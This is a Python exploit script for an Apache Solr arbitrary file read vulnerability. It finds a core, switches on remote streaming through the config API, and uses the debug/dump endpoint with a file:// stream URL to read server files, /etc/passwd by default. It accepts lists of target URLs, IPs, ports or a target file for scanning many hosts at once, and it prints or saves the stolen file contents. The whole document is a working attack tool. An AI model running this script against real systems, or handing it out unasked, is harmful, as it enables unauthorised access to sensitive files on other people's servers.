"""
:author zuiyue
"""
import argparse
import json
import re
import sys
from urllib.parse import urlparse

import requests
from rich.console import Console

console = Console()


def expliot(params: tuple) -> object:
    console.print("[blue][*] Starting...[/blue]")
    protocol, ip, port, read_file_name = params[0], params[1], params[2], params[3]
    if read_file_name is None:
        read_file_name = "/etc/passwd"
    if not 'http'.__eq__(protocol):
        protocol = 'https'
    base_url = protocol + '://' + ip + ':' + port
    try:
        resp1 = requests.get(url=base_url + '/solr/admin/cores',
                             params={'indexInfo': 'false', 'wt': 'json'},
                             verify=False, timeout=5)
        json_resp1 = json.loads(resp1.content)
        core_name = list(json_resp1.get('status').values())[0].get('name')
        resp2 = requests.post(url=base_url + f'/solr/{core_name}/config',
                              headers={'Content-Type': 'application/json'},
                              data='{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}')
        json_resp2 = json.loads(resp2.content)
        if 'This response format is experimental.  It is likely to change in the future.'.__eq__(
                json_resp2.get('WARNING')):
            resp3 = requests.post(url=base_url + f'/solr/{core_name}/debug/dump',
                                  params={'param': 'ContentStreams'},
                                  headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                  data=f'stream.url=file://{read_file_name}')
            json_resp3 = json.loads(resp3.content)
            read_file = json_resp3.get('streams')[0].get('stream')
            if 'root:x:0:0:root:/root:/bin/bash' in read_file:
                return resp3.url, read_file
    except requests.exceptions.RequestException as e:
        console.print(f"[red][ERROR] {e}[/red]")
        return
    except json.JSONDecodeError as e:
        console.print(f"[red][ERROR] {e}[/red]")
        return


def run(dict_args: argparse.Namespace):
    read_file_name = None
    params = list()
    if dict_args.red_file_name:
        read_file_name = dict_args.red_file_name
    if dict_args.target_url:
        for url in dict_args.target_url:
            parse_url = urlparse(url)
            p_netloc = parse_url.netloc.split(':')
            p_netloc.insert(0, parse_url.scheme)
            p_netloc.append(read_file_name)
            params.append(tuple(p_netloc))
    if dict_args.target_ip and dict_args.target_port:
        tmp = list()
        for ip in dict_args.target_ip:
            for port in dict_args.target_port:
                tmp.append(('http', ip, port, read_file_name))
        params += tmp
    if dict_args.target_file:
        tmp = list()
        targets = dict_args.target_file.readlines()
        for target in targets:
            if re.search('^http', target):
                p_url = urlparse(target)
                p_netloc = p_url.netloc.split(':')
                p_netloc.insert(0, p_url.scheme)
                p_netloc.append(read_file_name)
                params.append(tuple(p_netloc))
            else:
                p_url = target.replace('\n', '').split(':')
                p_url.insert(0, 'http')
                p_url.append(read_file_name)
                params.append(tuple(p_url))
    for parm in params:
        if re.search("(\\d{1,3}\\.?){4}", parm[1]) is None or parm[2] is None:
            console.print("[red]Please enter the correct target URL![/red]")
            sys.exit(25)
        vuln_point, read_file = None, None
        try:
            vuln_point, read_file = expliot(parm)
        except TypeError as e:
            console.print(f"[red][ERROR] {e}[/red]")
        if dict_args.output_file:
            file = dict_args.output_file
            if vuln_point and read_file:
                file.write(f"There's a vulnerability in the target, a vulnerability point:{vuln_point}\n")
                file.write(f"The content of the file read is\n{read_file}")
            else:
                file.write(f"There are no vulnerability in the target {parm[0]}://{parm[1]}:{parm[2]}")
        else:
            if vuln_point and read_file:
                console.print(
                    f"[blue][+][/blue] There's a vulnerability in the target, a vulnerability point:[green]{vuln_point}[/green]")
                console.print("[blue][+][/blue] The content of the file read is\n")
                print(read_file)
            else:
                console.print(
                    f"[blue][-][/blue] [red]There are no vulnerability in the target {parm[0]}://{parm[1]}:{parm[2]}[/red]")


def main():
    parser = argparse.ArgumentParser(prog='Solr',
                                     description='Apache Solr Arbitrary file reading vulnerability',
                                     exit_on_error=False)
    parser.add_argument('-u', '--target-url', type=str, nargs='*',
                        action='extend', dest='target_url',
                        help='The URL of target, example http://127.0.0.1:8080')
    parser.add_argument('-i', '--target-ip', type=str, nargs='*',
                        action='extend', dest='target_ip',
                        help='The IP of target, example 127.0.0.1')
    parser.add_argument('-p', '--target-port', type=str, nargs='*',
                        action='extend', dest='target_port',
                        help='The PORT of target, example 1000,2000,8080,8089')
    parser.add_argument('-r', '--read-file', type=str, dest='red_file_name',
                        help='You want to read file of target, default is /etc/passwd')
    parser.add_argument('-f', '--file', dest='target_file', nargs='?',
                        type=argparse.FileType('r', encoding='u8'),
                        help='If you have many targets, you can choose a file')
    parser.add_argument('-o', '--out-file', dest='output_file', nargs='?',
                        type=argparse.FileType('w', encoding='u8'),
                        help='If you want to output result for a file, you can choose it')
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0')
    if len(sys.argv) <= 1:
        parser.print_help()
    try:
        args = parser.parse_args()
        run(args)
    except argparse.ArgumentError as e:
        console.print(f"[red][ERROR] {e}[/red]")
        print('Please enter the correct parameters')
        parser.print_help()


if __name__ == '__main__':
    # expliot(('http', '127.0.0.1', '8983'))
    banner = """        #####                       
        #     #  ####  #      #####  
        #       #    # #      #    # 
         #####  #    # #      #    # 
              # #    # #      #####  
        #     # #    # #      #   #  
         #####   ####  ###### #    #   
    """
    console.print(banner)

    main()
